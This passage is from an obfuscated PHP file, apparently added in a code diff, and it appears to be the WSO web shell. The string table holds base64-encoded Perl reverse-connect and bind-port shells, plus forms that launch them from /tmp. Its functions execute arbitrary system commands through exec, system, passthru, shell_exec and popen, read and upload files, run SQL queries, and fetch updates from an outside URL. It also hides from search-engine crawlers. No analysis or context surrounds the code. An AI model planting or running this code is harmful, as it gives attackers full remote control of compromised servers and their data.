onclick='document.sf.p2.value=\"download\";document.sf.submit();'><br>File path:<input type=text name=file value='dump.sql'></td><td style='border-top:2px solid #666;'>", 755 => "query", 756 => "<script>d.sf.onsubmit=function(){st(\"", 757 => "\", d.sf.p3.value)}</script><span>", 758 => ">", 759 => " <a href=# onclick='st(\"", 760 => "\", ", 761 => ")'>&lt; Prev</a>", 762 => ")'>Next &gt;</a>", 763 => " LIMIT 30 OFFSET ", 764 => "` LIMIT ", 765 => ",30", 766 => "<br><br>", 767 => "<table width=100% cellspacing=1 cellpadding=2 class=main style=\"background-color:#292929\">", 768 => "<tr>", 769 => "<th>", 770 => "</th>", 771 => "</tr><tr>", 772 => "<tr class=\"l", 773 => "<td><i>null</i></td>", 774 => "<td>", 775 => "</tr>", 776 => "</table>", 777 => "<div><b>Error:</b> ", 778 => "<br></form><form onsubmit='d.sf.p1.value=\"query\";d.sf.p2.value=this.query.value;document.sf.submit();return false;'><textarea name='query' style='width:100%;height:100px'>", 779 => "loadfile", 780 => "</textarea><br/><input type=submit value='Execute'>", 781 => "</td></tr>", 782 => "</table></form><br/>", 783 => "SELECT 1 FROM mysql.user WHERE concat(`user`, '@', `host`) = USER() AND `File_priv` = 'y'", 784 => "<form onsubmit='d.sf.p1.value=\"loadfile\";document.sf.p2.value=this.f.value;document.sf.submit();return false;'><span>Load file</span> <input  class='toolsInp' type=text name=f><input type=submit value='>>'></form>", 785 => "<br/><pre class=ml1>", 786 => "IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7", 787 => "IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=", 788 => "<h1>Network tools</h1><div class=content>\n\t<form name='nfp' onSubmit=\"g(null,null,'bpp',this.port.value);return false;\">\n\t<span>Bind port to /bin/sh [perl]</span><br/>\n\tPort: <input type='text' name='port' value='31337'> <input type=submit value='>>'>\n\t</form>\n\t<form name='nfp' onSubmit=\"g(null,null,'bcp',this.server.value,this.port.value);return false;\">\n\t<span>Back-connect  [perl]</span><br/>\n\tServer: <input type='text' name='server' value='", 789 => "'> Port: <input type='text' name='port' value='31337'> <input type=submit value='>>'>\n\t</form><br>", 790 => "file_put_contents", 791 => "bpp", 792 => "/tmp/bp.pl", 793 => "perl /tmp/bp.pl ", 794 => " 1>/dev/null 2>&1 &", 795 => "ps aux | grep bp.pl", 796 => "</pre>", 797 => "bcp", 798 => "/tmp/bc.pl", 799 => "perl /tmp/bc.pl ", 800 => " ", 801 => "ps aux | grep bc.pl", 802 => "<h1>UPdate</h1><div class=content>", 803 => "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0", 804 => "http://filestack.live/96382367f90798e98d30f82012963197.htm", 805 => "/<\\?php/", 806 => "<center><font color=\"red\"><p>[-] Failed.</p></font></center>", 807 => "<center>./Done !<br></center>", 808 => "uname", 809 => "php_version", 810 => "wso_version", 811 => "safemode", 812 => "action");
+if (!function_exists($GLOBALS[ям][0]) && function_exists($GLOBALS[ям][0x1])) {
+    function iconv($input_encoding, $output_encoding, $string)
+    {
+        return libiconv($input_encoding, $output_encoding, $string);
+    }
+}
+if (!function_exists($GLOBALS[ям][0]) && function_exists($GLOBALS[ям][0x2])) {
+    function iconv($from_encoding, $to_encoding, $string)
+    {
+        return mb_convert_encoding($string, $to_encoding, $from_encoding);
+    }
+}
+if (!function_exists($GLOBALS[ям][0])) {
+    function iconv($from_encoding, $to_encoding, $string)
+    {
+        return html_entity_decode(htmlentities($string, ENT_QUOTES, $from_encoding), ENT_QUOTES, $to_encoding);
+    }
+}
+$color = $GLOBALS[ям][0x3];
+$default_action = $GLOBALS[ям][0x4];
+$default_use_ajax = !0;
+$default_charset = $GLOBALS[ям][0x5];
+if (!empty($_SERVER[$GLOBALS[ям][0x6]])) {
+    $userAgents = array($GLOBALS[ям][0x7], $GLOBALS[ям][0x8], $GLOBALS[ям][0x9], $GLOBALS[ям][0xa], $GLOBALS[ям][0xb], $GLOBALS[ям][0xc]);
+    if (preg_match($GLOBALS[ям][0xd] . implode($GLOBALS[ям][0xe], $userAgents) . $GLOBALS[ям][0xf], $_SERVER[$GLOBALS[ям][0x6]])) {
+        header($GLOBALS[ям][0x10]);
+        exit;
+    }
+}
+@ini_set($GLOBALS[ям][0x11], NULL);
+@ini_set($GLOBALS[ям][0x12], 0);
+@ini_set($GLOBALS[ям][0x13], 0);
+@set_time_limit(0);
+if (false) {
+    @set_magic_quotes_runtime(0);
+}
+@define($GLOBALS[ям][0x14], $GLOBALS[ям][0x15]);
+if (function_exists($GLOBALS[ям][0x16])) {
+    if (get_magic_quotes_gpc()) {
+        function WSOstripslashes($array)
+        {
+            return is_array($array) ? array_map($GLOBALS[ям][0x17], $array) : stripslashes($array);
+        }
+        $_POST = WSOstripslashes($_POST);
+        $_COOKIE = WSOstripslashes($_COOKIE);
+    }
+}
+function WSOsetcookie($k, $v)
+{
+    $_COOKIE[$k] = $v;
+    setcookie($k, $v);
+}
+if (strtolower("PHP") == $GLOBALS[ям][0x18]) {
+    $os = $GLOBALS[ям][0x19];
+} else {
+    $os = $GLOBALS[ям][0x1a];
+}
+$safe_mode = @ini_get($GLOBALS[ям][0x1b]);
+if (!$safe_mode) {
+    error_reporting(0);
+}
+$disable_functions = @ini_get($GLOBALS[ям][0x1c]);
+$home_cwd = @getcwd();
+if (isset($_POST[$GLOBALS[ям][0x1d]])) {
+    @chdir($_POST[$GLOBALS[ям][0x1d]]);
+}
+$cwd = @getcwd();
+if ($os == $GLOBALS[ям][0x19]) {
+    $home_cwd = str_replace($GLOBALS[ям][0x1e], $GLOBALS[ям][0x1f], $home_cwd);
+    $cwd = str_replace($GLOBALS[ям][0x1e], $GLOBALS[ям][0x1f], $cwd);
+}
+if ($cwd[strlen($cwd) - 0x1] != $GLOBALS[ям][0xd]) {
+    $cwd .= $GLOBALS[ям][0xd];
+}
+if (!isset($_COOKIE[md5($_SERVER[$GLOBALS[ям][0x20]]) . $GLOBALS[ям][0x21]])) {
+    $_COOKIE[md5($_SERVER[$GLOBALS[ям][0x20]]) . $GLOBALS[ям][0x21]] = (bool) $default_use_ajax;
+}
+if ($os == $GLOBALS[ям][0x19]) {
+    $aliases = array($GLOBALS[ям][0x22] => $GLOBALS[ям][0x23], $GLOBALS[ям][0x24] => $GLOBALS[ям][0x25], $GLOBALS[ям][0x26] => $GLOBALS[ям][0x27], $GLOBALS[ям][0x28] => $GLOBALS[ям][0x29], $GLOBALS[ям][0x2a] => $GLOBALS[ям][0x2b], $GLOBALS[ям][0x2c] => $GLOBALS[ям][0x2d], $GLOBALS[ям][0x2e] => $GLOBALS[ям][0x2f], $GLOBALS[ям][0x30] => $GLOBALS[ям][0x31], $GLOBALS[ям][0x32] => $GLOBALS[ям][0x33]);
+} else {
+    $aliases = array($GLOBALS[ям][0x34] => $GLOBALS[ям][0x35], $GLOBALS[ям][0x36] => $GLOBALS[ям][0x37], $GLOBALS[ям][0x38] => $GLOBALS[ям][0x39], $GLOBALS[ям][0x3a] => $GLOBALS[ям][0x3b], $GLOBALS[ям][0x3c] => $GLOBALS[ям][0x3d], $GLOBALS[ям][0x3e] => $GLOBALS[ям][0x3f], $GLOBALS[ям][0x40] => $GLOBALS[ям][0x41], $GLOBALS[ям][0x42] => $GLOBALS[ям][0x43], $GLOBALS[ям][0x44] => $GLOBALS[ям][0x45], $GLOBALS[ям][0x46] => $GLOBALS[ям][0x47], $GLOBALS[ям][0x48] => $GLOBALS[ям][0x49], $GLOBALS[ям][0x4a] => $GLOBALS[ям][0x4b], $GLOBALS[ям][0x4c] => $GLOBALS[ям][0x4d], $GLOBALS[ям][0x4e] => $GLOBALS[ям][0x4f], $GLOBALS[ям][0x50] => $GLOBALS[ям][0x51], $GLOBALS[ям][0x52] => $GLOBALS[ям][0x53], $GLOBALS[ям][0x54] => $GLOBALS[ям][0x55], $GLOBALS[ям][0x56] => $GLOBALS[ям][0x57], $GLOBALS[ям][0x58] => $GLOBALS[ям][0x59], $GLOBALS[ям][0x5a] => $GLOBALS[ям][0x5b], $GLOBALS[ям][0x5c] => $GLOBALS[ям][0x5d], $GLOBALS[ям][0x5e] => $GLOBALS[ям][0x5f], $GLOBALS[ям][0x60] => $GLOBALS[ям][0x3d], $GLOBALS[ям][0x61] => $GLOBALS[ям][0x62], $GLOBALS[ям][0x63] => $GLOBALS[ям][0x64], $GLOBALS[ям][0x65] => $GLOBALS[ям][0x66], $GLOBALS[ям][0x67] => $GLOBALS[ям][0x68], $GLOBALS[ям][0x69] => $GLOBALS[ям][0x6a], $GLOBALS[ям][0x6b] => $GLOBALS[ям][0x6c], $GLOBALS[ям][0x6d] => $GLOBALS[ям][0x6e], $GLOBALS[ям][0x6f] => $GLOBALS[ям][0x70], $GLOBALS[ям][0x71] => $GLOBALS[ям][0x72], $GLOBALS[ям][0x73] => $GLOBALS[ям][0x74], $GLOBALS[ям][0x75] => $GLOBALS[ям][0x76], $GLOBALS[ям][0x77] => $GLOBALS[ям][0x77], $GLOBALS[ям][0x78] => $GLOBALS[ям][0x79], $GLOBALS[ям][0x7a] => $GLOBALS[ям][0x7b], $GLOBALS[ям][0x7c] => $GLOBALS[ям][0x7d], $GLOBALS[ям][0x7e] => $GLOBALS[ям][0x7f], $GLOBALS[ям][0x80] => $GLOBALS[ям][0x81], $GLOBALS[ям][0x82] => $GLOBALS[ям][0x83], $GLOBALS[ям][0x84] => $GLOBALS[ям][0x85], $GLOBALS[ям][0x86] => $GLOBALS[ям][0x87], $GLOBALS[ям][0x88] => $GLOBALS[ям][0x89], $GLOBALS[ям][0x8a] => $GLOBALS[ям][0x8b], $GLOBALS[ям][0x8c] => $GLOBALS[ям][0x8d], $GLOBALS[ям][0x8e] => $GLOBALS[ям][0x8f]);
+}
+function wsoHeader()
+{
+    if (empty($_POST[$GLOBALS[ям][0x90]])) {
+        $_POST[$GLOBALS[ям][0x90]] = $GLOBALS[$GLOBALS[ям][0x91]];
+    }
+    global $color;
+    echo $GLOBALS[ям][0x92] . $_POST[$GLOBALS[ям][0x90]] . $GLOBALS[ям][0x93] . $_SERVER[$GLOBALS[ям][0x20]] . "</title>\n<style>\nbody{background-color:#444;color:#e1e1e1;}\nbody,td,th{ font: 9pt Lucida,Verdana;margin:0;vertical-align:top;color:#e1e1e1; }\ntable.info{ color:#fff;background-color:#222; }\nspan,h1,a{ color: {$color} !important; }\nspan{ font-weight: bolder; }\nh1{ border-left:5px solid {$color};padding: 2px 5px;font: 14pt Verdana;background-color:#222;margin:0px; }\ndiv.content{ padding: 5px;margin-left:5px;background-color:#333; }\na{ text-decoration:none; }\na:hover{ text-decoration:underline; }\n.ml1{ border:1px solid #444;padding:5px;margin:0;overflow: auto; }\n.bigarea{ width:100%;height:300px; }\ninput,textarea,select{ margin:0;color:#fff;background-color:#555;border:1px solid {$color}; font: 9pt Monospace,'Courier New'; }\nform{ margin:0px; }\n#toolsTbl{ text-align:center; }\n.toolsInp{ width: 300px }\n.main th{text-align:left;background-color:#5e5e5e;}\n.main tr:hover{background-color:#5e5e5e}\n.l1{background-color:#444}\n.l2{background-color:#333}\npre{font-family:Courier,Monospace;}\n</style>\n<script>\n    var c_ = '" . htmlspecialchars($GLOBALS[$GLOBALS[ям][0x94]]) . $GLOBALS[ям][0x95] . htmlspecialchars(@$_POST[$GLOBALS[ям][0x96]]) . $GLOBALS[ям][0x97] . htmlspecialchars(@$_POST[$GLOBALS[ям][0x90]]) . $GLOBALS[ям][0x98] . (strpos(@$_POST[$GLOBALS[ям][0x99]], $GLOBALS[ям][0x9a]) !== !1 ? $GLOBALS[ям][0x9b] : htmlspecialchars($_POST[$GLOBALS[ям][0x99]], ENT_QUOTES)) . $GLOBALS[ям][0x9c] . (strpos(@$_POST[$GLOBALS[ям][0x9d]], $GLOBALS[ям][0x9a]) !== !1 ? $GLOBALS[ям][0x9b] : htmlspecialchars($_POST[$GLOBALS[ям][0x9d]], ENT_QUOTES)) . $GLOBALS[ям][0x9e] . (strpos(@$_POST[$GLOBALS[ям][0x9f]], $GLOBALS[ям][0x9a]) !== !1 ? $GLOBALS[ям][0x9b] : htmlspecialchars($_POST[$GLOBALS[ям][0x9f]], ENT_QUOTES)) . $GLOBALS[ям][0xa0] . addslashes($_SERVER[$GLOBALS[ям][0xa1]]) . $GLOBALS[ям][0xa2];
+    $freeSpace = @diskfreespace($GLOBALS[$GLOBALS[ям][0x94]]);
+    $totalSpace = @disk_total_space($GLOBALS[$GLOBALS[ям][0x94]]);
+    $totalSpace = $totalSpace ? $totalSpace : 0x1;
+    $release = @php_uname($GLOBALS[ям][0xa3]);
+    $kernel = @php_uname($GLOBALS[ям][0xa4]);
+    if (!function_exists($GLOBALS[ям][0xa5])) {
+        $user = @get_current_user();
+        $uid = @getmyuid();
+        $gid = @getmygid();
+        $group = $GLOBALS[ям][0xa6];
+    } else {
+        $uid = @posix_getpwuid(posix_geteuid());
+        $gid = @posix_getgrgid(posix_getegid());
+        $user = $uid[$GLOBALS[ям][0xa7]];
+        $uid = $uid[$GLOBALS[ям][0xa8]];
+        $group = $gid[$GLOBALS[ям][0xa7]];
+        $gid = $gid[$GLOBALS[ям][0xa9]];
+    }
+    $cwd_links = $GLOBALS[ям][0x9b];
+    $path = explode($GLOBALS[ям][0x1f], $GLOBALS[$GLOBALS[ям][0x94]]);
+    $n = count($path);
+    for ($i = 0; $i < $n - 0x1; $i++) {
+        $cwd_links .= $GLOBALS[ям][0xaa];
+        for ($j = 0; $j <= $i; $j++) {
+            $cwd_links .= $path[$j] . $GLOBALS[ям][0xd];
+        }
+        $cwd_links .= $GLOBALS[ям][0xab] . $path[$i] . $GLOBALS[ям][0xac];
+    }
+    $charsets = array($GLOBALS[ям][0xad], $GLOBALS[ям][0x5], $GLOBALS[ям][0xae], $GLOBALS[ям][0xaf], $GLOBALS[ям][0xb0]);
+    $opt_charsets = $GLOBALS[ям][0x9b];
+    foreach ($charsets as $item) {
+        $opt_charsets .= $GLOBALS[ям][0xb1] . $item . $GLOBALS[ям][0xb2] . ($_POST[$GLOBALS[ям][0x90]] == $item ? $GLOBALS[ям][0xb3] : $GLOBALS[ям][0x9b]) . $GLOBALS[ям][0xb4] . $item . $GLOBALS[ям][0xb5];
+    }
+    $m = array($GLOBALS[ям][0xb6] => $GLOBALS[ям][0xb7], $GLOBALS[ям][0xb8] => $GLOBALS[ям][0x4], $GLOBALS[ям][0xb9] => $GLOBALS[ям][0xb9], $GLOBALS[ям][0xba] => $GLOBALS[ям][0xba], $GLOBALS[ям][0xbb] => $GLOBALS[ям][0xbc], $GLOBALS[ям][0xbd] => $GLOBALS[ям][0xbd], $GLOBALS[ям][0xbe] => $GLOBALS[ям][0xbf], $GLOBALS[ям][0xc0] => $GLOBALS[ям][0xc0], $GLOBALS[ям][0xc1] => $GLOBALS[ям][0xc1]);
+    if (!empty($GLOBALS[$GLOBALS[ям][0xc2]])) {
+        $m[$GLOBALS[ям][0xc3]] = $GLOBALS[ям][0xc3];
+    }
+    $m[$GLOBALS[ям][0xc4]] = $GLOBALS[ям][0xc5];
+    $menu = $GLOBALS[ям][0x9b];
+    foreach ($m as $k => $v) {
+        if ($k == $GLOBALS[ям][0xbb]) {
+            $menu .= $GLOBALS[ям][0xc6] . (int) (0x64 / count($m)) . $GLOBALS[ям][0xc7] . $v . $GLOBALS[ям][0xc8] . $k . $GLOBALS[ям][0xc9];
+        } else {
+            $menu .= $GLOBALS[ям][0xc6] . (int) (0x64 / count($m)) . $GLOBALS[ям][0xc7] . $v . $GLOBALS[ям][0xca] . $k . $GLOBALS[ям][0xcb];
+        }
+    }
+    $drives = $GLOBALS[ям][0x3d];
+    if ($GLOBALS[$GLOBALS[ям][0xcc]] == $GLOBALS[ям][0x19]) {
+        foreach (range($GLOBALS[ям][0x1d], $GLOBALS[ям][0xcd]) as $drive) {
+            if (is_dir($drive . $GLOBALS[ям][0xce])) {
+                $drives .= $GLOBALS[ям][0xcf] . $drive . $GLOBALS[ям][0xd0] . $drive . $GLOBALS[ям][0xd1];
+            }
+        }
+    }
+    echo $GLOBALS[ям][0xd2] . ($GLOBALS[$GLOBALS[ям][0xcc]] == $GLOBALS[ям][0x19] ? $GLOBALS[ям][0xd3] : $GLOBALS[ям][0x9b]) . $GLOBALS[ям][0xd4] . $GLOBALS[ям][0xd5] . substr(@php_uname(), 0, 0x78) . $GLOBALS[ям][0xd6] . $uid . $GLOBALS[ям][0xd7] . $user . $GLOBALS[ям][0xd8] . $gid . $GLOBALS[ям][0xd7] . $group . $GLOBALS[ям][0xd9] . @phpversion() . $GLOBALS[ям][0xda] . ($GLOBALS[$GLOBALS[ям][0x1b]] ? $GLOBALS[ям][0xdb] : $GLOBALS[ям][0xdc]) . $GLOBALS[ям][0xdd] . date($GLOBALS[ям][0xde]) . $GLOBALS[ям][0xdf] . wsoViewSize($totalSpace) . $GLOBALS[ям][0xe0] . wsoViewSize($freeSpace) . $GLOBALS[ям][0xe1] . (int) ($freeSpace / $totalSpace * 0x64) . $GLOBALS[ям][0xe2] . $cwd_links . $GLOBALS[ям][0xe3] . wsoPermsColor($GLOBALS[$GLOBALS[ям][0x94]]) . $GLOBALS[ям][0xe4] . $GLOBALS[$GLOBALS[ям][0xe5]] . $GLOBALS[ям][0xe6] . $drives . $GLOBALS[ям][0xe7] . $GLOBALS[ям][0xe8] . $opt_charsets . $GLOBALS[ям][0xe9] . @$_SERVER[$GLOBALS[ям][0xea]] . $GLOBALS[ям][0xeb] . $_SERVER[$GLOBALS[ям][0xec]] . $GLOBALS[ям][0xed] . $GLOBALS[ям][0xee] . $menu . $GLOBALS[ям][0xef];
+}
+function wsoFooter()
+{
+    $is_writable = is_writable($GLOBALS[$GLOBALS[ям][0x94]]) ? $GLOBALS[ям][0xf0] : $GLOBALS[ям][0xf1];
+    echo $GLOBALS[ям][0xf2] . htmlspecialchars($GLOBALS[$GLOBALS[ям][0x94]]) . "'><input type=submit value='>>'></form></td>\n\t\t<td><form onsubmit=\"g('FilesTools',null,this.f.value);return false;\"><span>Read file:</span><br><input class='toolsInp' type=text name=f><input type=submit value='>>'></form></td>\n\t</tr><tr>\n\t\t<td><form onsubmit=\"g('FilesMan',null,'mkdir',this.d.value);return false;\"><span>Make dir:</span>{$is_writable}<br><input class='toolsInp' type=text name=d><input type=submit value='>>'></form></td>\n\t\t<td><form onsubmit=\"g('FilesTools',null,this.f.value,'mkfile');return false;\"><span>Make file:</span>{$is_writable}<br><input class='toolsInp' type=text name=f><input type=submit value='>>'></form></td>\n\t</tr><tr>\n\t\t<td><form onsubmit=\"g('Console',null,this.c.value);return false;\"><span>Execute:</span><br><input class='toolsInp' type=text name=c value=''><input type=submit value='>>'></form></td>\n\t\t<td><form method='post' ENCTYPE='multipart/form-data'>\n\t\t<input type=hidden name=a value='FilesMAn'>\n\t\t<input type=hidden name=c value='" . $GLOBALS[$GLOBALS[ям][0x94]] . $GLOBALS[ям][0xf3] . (isset($_POST[$GLOBALS[ям][0x90]]) ? $_POST[$GLOBALS[ям][0x90]] : $GLOBALS[ям][0x9b]) . "'>\n\t\t<span>Upload file:</span>{$is_writable}<br><input class='toolsInp' type=file name=f><input type=submit value='>>'></form><br  ></td>\n\t</tr></table></div></body></html>";
+}
+if (!function_exists($GLOBALS[ям][0xf4]) && strpos($GLOBALS[$GLOBALS[ям][0x1c]], $GLOBALS[ям][0xf5]) === !1) {
+    function posix_getpwuid($p)
+    {
+        return !1;
+    }
+}
+if (!function_exists($GLOBALS[ям][0xf6]) && strpos($GLOBALS[$GLOBALS[ям][0x1c]], $GLOBALS[ям][0xf7]) === !1) {
+    function posix_getgrgid($p)
+    {
+        return !1;
+    }
+}
+function wsoEx($in)
+{
+    $out = $GLOBALS[ям][0x9b];
+    if (function_exists($GLOBALS[ям][0xf8])) {
+        @exec($in, $out);
+        $out = @join($GLOBALS[ям][0x9a], $out);
+    } elseif (function_exists($GLOBALS[ям][0xf9])) {
+        ob_start();
+        @passthru($in);
+        $out = ob_get_clean();
+    } elseif (function_exists($GLOBALS[ям][0xfa])) {
+        ob_start();
+        @system($in);
+        $out = ob_get_clean();
+    } elseif (function_exists($GLOBALS[ям][0xfb])) {
+        $out = shell_exec($in);
+    } elseif (is_resource($f = @popen($in, $GLOBALS[ям][0xfc]))) {
+        $out = $GLOBALS[ям][0x3d];
+        while (!@feof($f)) {
+            $out .= fread($f, 0x400);
+        }
+        pclose($f);
+    }
+    return $out;
+}
+function wsoViewSize($s)
+{
+    if (is_int($s)) {
+        $s = sprintf($GLOBALS[ям][0xfd], $s);
+    }
+    if ($s >= 0x40000000) {
+        return sprintf($GLOBALS[ям][0xfe], $s / 0x40000000) . $GLOBALS[ям][0xff];
+    } elseif ($s >= 0x100000) {
+        return sprintf($GLOBALS[ям][0xfe], $s / 0x100000) . $GLOBALS[ям][0x100];
+    } elseif ($s >= 0x400) {
+        return sprintf($GLOBALS[ям][0xfe], $s / 0x400) . $GLOBALS[ям][0x101];
+    } else {
+        return $s . $GLOBALS[ям][0x102];
+    }
+}
+function wsoPerms($p)
+{
+    if (($p & 0xc000) == 0xc000) {
+        $i = $GLOBALS[ям][0xa4];
+    } elseif (($p & 0xa000) == 0xa000) {
+        $i = $GLOBALS[ям][0x103];
+    } elseif (($p & 0x8000) == 0x8000) {
+        $i = $GLOBALS[ям][0x104];
+    } elseif (($p & 0x6000) == 0x6000) {
+        $i = $GLOBALS[ям][0x105];
+    } elseif (($p & 0x4000) == 0x4000) {
+        $i = $GLOBALS[ям][0x106];
+    } elseif (($p & 0x2000) == 0x2000) {
+        $i = $GLOBALS[ям][0x1d];
+    } elseif (($p & 0x1000) == 0x1000) {
+        $i = $GLOBALS[ям][0x107];
+    } else {
+        $i = $GLOBALS[ям][0x108];
+    }
+    $i .= $p & 0x100 ? $GLOBALS[ям][0xa3] : $GLOBALS[ям][0x104];
+    $i .= $p & 0x80 ? $GLOBALS[ям][0x109] : $GLOBALS[ям][0x104];
+    $i .= $p & 0x40 ? $p & 0x800 ? $GLOBALS[ям][0xa4] : $GLOBALS[ям][0x10a] : ($p & 0x800 ? $GLOBALS[ям][0x10b] : $GLOBALS[ям][0x104]);
+    $i .= $p & 0x20 ? $GLOBALS[ям][0xa3] : $GLOBALS[ям][0x104];
+    $i .= $p & 0x10 ? $GLOBALS[ям][0x109] : $GLOBALS[ям][0x104];
+    $i .= $p & 0x8 ? $p & 0x400 ? $GLOBALS[ям][0xa4] : $GLOBALS[ям][0x10a] : ($p & 0x400 ? $GLOBALS[ям][0x10b] : $GLOBALS[ям][0x104]);
+    $i .= $p & 0x4 ? $GLOBALS[ям][0xa3] : $GLOBALS[ям][0x104];
+    $i .= $p & 0x2 ? $GLOBALS[ям][0x109] : $GLOBALS[ям][0x104];
+    $i .= $p & 0x1 ? $p & 0x200 ? $GLOBALS[ям][0x10c] : $GLOBALS[ям][0x10a] : ($p & 0x200 ? $GLOBALS[ям][0x10d] : $GLOBALS[ям][0x104]);
+    return $i;
+}
+function wsoPermsColor($f)
+{
+    if (!@is_readable($f)) {
+        return $GLOBALS[ям][0x10e] . wsoPerms(@fileperms($f)) . $GLOBALS[ям][0x10f];
+    } elseif (!@is_writable($f)) {
+        return $GLOBALS[ям][0x110] . wsoPerms(@fileperms($f)) . $GLOBALS[ям][0x10f];
+    } else {
+        return $GLOBALS[ям][0x111] . wsoPerms(@fileperms($f)) . $GLOBALS[ям][0x10f];
+    }
+}
+function wsoScandir($dir)
+{
+    if (function_exists($GLOBALS[ям][0x112])) {
+        return scandir($dir);
+    } else {
+        $dh = opendir($dir);
+        while (!1 !== ($filename = readdir($dh))) {
+            $files[] = $filename;
+        }
+        return $files;
+    }
+}
+function wsoWhich($p)
+{
+    $path = wsoEx($GLOBALS[ям][0x113] . $p);
+    if (!empty($path)) {
+        return $path;
+    }
+    return !1;
+}
+function actionSecInfo()
+{
+    wsoHeader();
+    echo $GLOBALS[ям][0x114];
+    function wsoSecParam($n, $v)
+    {
+        $v = trim($v);
+        if ($v) {
+            echo $GLOBALS[ям][0x115] . $n . $GLOBALS[ям][0x116];
+            if (strpos($v, $GLOBALS[ям][0x9a]) === !1) {
+                echo $v . $GLOBALS[ям][0xdf];
+            } else {
+                echo $GLOBALS[ям][0x117] . $v . $GLOBALS[ям][0x118];
+            }
+        }
+    }
+    wsoSecParam($GLOBALS[ям][0x119], @getenv($GLOBALS[ям][0x11a]));
+    if (function_exists($GLOBALS[ям][0x11b])) {
+        wsoSecParam($GLOBALS[ям][0x11c], implode($GLOBALS[ям][0x11d], apache_get_modules()));
+    }
+    wsoSecParam($GLOBALS[ям][0x11e], $GLOBALS[$GLOBALS[ям][0x1c]] ? $GLOBALS[$GLOBALS[ям][0x1c]] : $GLOBALS[ям][0x11f]);
+    wsoSecParam($GLOBALS[ям][0x120], @ini_get($GLOBALS[ям][0x121]));
+    wsoSecParam($GLOBALS[ям][0x122], @ini_get($GLOBALS[ям][0x123]));
+    wsoSecParam($GLOBALS[ям][0x124], @ini_get($GLOBALS[ям][0x125]));
+    wsoSecParam($GLOBALS[ям][0x126], function_exists($GLOBALS[ям][0x127]) ? $GLOBALS[ям][0x128] : $GLOBALS[ям][0x129]);
+    $temp = array();
+    if (function_exists($GLOBALS[ям][0x12a])) {
+        $temp[] = $GLOBALS[ям][0x12b] . mysql_get_client_info() . $GLOBALS[ям][0x12c];
+    }
+    if (function_exists($GLOBALS[ям][0x12d])) {
+        $temp[] = $GLOBALS[ям][0x12e];
+    }
+    if (function_exists($GLOBALS[ям][0x12f])) {
+        $temp[] = $GLOBALS[ям][0x130];
+    }
+    if (function_exists($GLOBALS[ям][0x131])) {
+        $temp[] = $GLOBALS[ям][0x132];
+    }
+    wsoSecParam($GLOBALS[ям][0x133], implode($GLOBALS[ям][0x11d], $temp));
+    echo $GLOBALS[ям][0xdf];
+    if ($GLOBALS[$GLOBALS[ям][0xcc]] == $GLOBALS[ям][0x1a]) {
+        wsoSecParam($GLOBALS[ям][0x134], @is_readable($GLOBALS[ям][0x135]) ? $GLOBALS[ям][0x136] : $GLOBALS[ям][0x129]);
+        wsoSecParam($GLOBALS[ям][0x137], @is_readable($GLOBALS[ям][0x138]) ? $GLOBALS[ям][0x139] : $GLOBALS[ям][0x129]);
+        wsoSecParam($GLOBALS[ям][0x13a], @file_get_contents($GLOBALS[ям][0x13b]));
+        wsoSecParam($GLOBALS[ям][0x13c], @file_get_contents($GLOBALS[ям][0x13d]));
+        if (!$GLOBALS[$GLOBALS[ям][0x1b]]) {
+            $userful = array($GLOBALS[ям][0x13e], $GLOBALS[ям][0x13f], $GLOBALS[ям][0x140], $GLOBALS[ям][0x141], $GLOBALS[ям][0x142], $GLOBALS[ям][0x143], $GLOBALS[ям][0x144], $GLOBALS[ям][0x145], $GLOBALS[ям][0x146], $GLOBALS[ям][0x147], $GLOBALS[ям][0x148], $GLOBALS[ям][0x149], $GLOBALS[ям][0x14a], $GLOBALS[ям][0x14b], $GLOBALS[ям][0x14c], $GLOBALS[ям][0x14d]);
